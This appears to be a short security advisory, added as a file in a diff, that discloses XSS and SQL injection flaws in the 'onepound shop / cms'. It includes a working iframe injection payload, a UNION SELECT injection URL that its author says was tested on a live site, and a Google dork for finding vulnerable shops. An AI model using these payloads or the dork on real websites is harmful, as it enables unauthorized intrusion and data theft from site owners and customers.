@@ -1,0 +1,43 @@
+:: General information
+:: onepound shop / cms XSS and SQL Injection vulnerabilities
+:: by Valentin Hoebel
+:: valentin@xenuser.org
+
+:: Product information
+:: Name = onepound shop / cms
+:: Vendor = onepound
+:: Vendor Website = http://www.onepound.cn
+:: About the product = no information available
+:: Affected versions = no information available
+:: Google dork = e.g. "inurl:productview.php?id=" and look for Asian shopping portals :D
+
+
+:: Vulnerabilities
+
+#1 XSS
+Several parts of the onepound shop / cms don't filter out HTMl or Java Script code, e.g. the search field.
+
+Example for HTML code:
+"><iframe src=http://www.google.de></iframe>
+
+Example for typical XSS URL:
+http://some-cool-domain.tld/productinfo.php?keyword="><iframe src=http://www.google.de></iframe>
+--------------------------------------------------------------------------------------------------------
+
+
+#2 SQL Injection
+On 13th July 2009 Affix <root@root-the.net> discovered that the products.php file is vulnerable for SQL injections.
+Browsing their shop systems and testing stuff revealed also other possibilities for injecting SQL stuff. I was not able to find out if the other files were already vulnerable then Affix published his advisory.
+
+Vulnerable URLs:
+http://some-cool-domain.tld/productinfo.php?id=[SQL injection]
+http://some-cool-domain.tld/productview.php?id=[SQL injection]
+
+Example for injecting SQL stuff:
+http://some-cool-domain.tld/productinfo.php?id=236+AND+1=2+UNION+SELECT+1,concat(user()),concat(user()),4,5,concat(user()),concat(user()),concat(user()),9,10,11,12,13,14,15-- 
+(Tested on a live website using onepound shop / cms.)
+--------------------------------------------------------------------------------------------------------
+
+
+:: Additional information
+Sadly I was not able to gather more information about affected versions or products they are selling. Quick checks shows that many websites are using their shop / cms and are vulnerable in many ways.
